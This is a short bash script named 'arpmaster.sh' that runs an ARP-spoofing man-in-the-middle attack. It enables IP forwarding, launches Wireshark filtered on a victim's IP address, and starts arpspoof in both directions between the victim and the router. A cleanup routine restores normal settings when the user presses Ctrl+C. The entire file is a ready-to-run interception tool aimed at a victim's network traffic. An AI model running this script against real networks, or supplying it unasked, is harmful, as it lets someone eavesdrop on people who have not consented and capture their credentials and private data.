#!/bin/bash
# ARP Spoof + Capture + Auto Cleanup
# Usage: sudo ./arpmaster.sh <victim_ip> <router_ip> <interface>

if [ "$EUID" -ne 0 ]; then
  echo "⚠️ Please run as root (use sudo)"
  exit
fi

if [ $# -ne 3 ]; then
  echo "Usage: $0 <victim_ip> <router_ip> <interface>"
  echo "Example: sudo $0 192.168.1.23 192.168.1.1 wlan0"
  exit 1
fi

VICTIM=$1
ROUTER=$2
IFACE=$3

# --- Cleanup function ---
cleanup() {
  echo ""
  echo "[*] Stopping attack and cleaning up..."
  sysctl -w net.ipv4.ip_forward=0 >/dev/null
  killall arpspoof 2>/dev/null
  ip neigh flush all 2>/dev/null
  echo "[*] Done. Network should be normal again."
  exit 0
}

# Catch Ctrl+C and run cleanup
trap cleanup INT

# --- Start attack ---
echo "[*] Enabling IP forwarding..."
sysctl -w net.ipv4.ip_forward=1 >/dev/null

echo "[*] Starting Wireshark (filter: ip.addr == $VICTIM)..."
wireshark -k -i $IFACE -Y "ip.addr==$VICTIM" &

sleep 2

echo "[*] Launching ARP spoof..."
xterm -hold -e "arpspoof -i $IFACE -t $VICTIM $ROUTER" &
xterm -hold -e "arpspoof -i $IFACE -t $ROUTER $VICTIM" &

echo "[*] MITM running... Press Ctrl+C to stop and cleanup."
wait
